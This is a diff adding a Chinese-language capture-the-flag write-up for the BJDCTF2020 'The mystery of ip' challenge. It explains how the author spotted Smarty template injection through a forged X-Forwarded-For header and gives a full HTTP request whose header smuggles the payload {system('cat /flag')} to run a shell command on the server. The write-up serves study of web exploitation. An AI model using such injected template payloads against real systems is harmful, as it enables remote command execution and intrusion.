@@ -94,6 +94,27 @@ yds=flag
 
 # [BJDCTF2020]The mystery of ip
 
+一开始没有任何思路，但是在ip那里通过修改`X-Forwarded-For`请求头实现了任意ip，加了单引号等不报错，尝试SSTI
+
+`{{6*6}}`成功输出36，`{{1.__class__}}`看见报错`Smarty Compiler: Syntax error in template`
+
+知道了是Smarty模板，发送下面的请求包获取flag
+
+```
+GET /flag.php HTTP/1.1
+Host: node3.buuoj.cn:29070
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://node3.buuoj.cn:29070/hint.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+x-forwarded-for:{system('cat /flag')}
+Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397e
+Connection: close
+```
+
 
 
 # 仓库地址
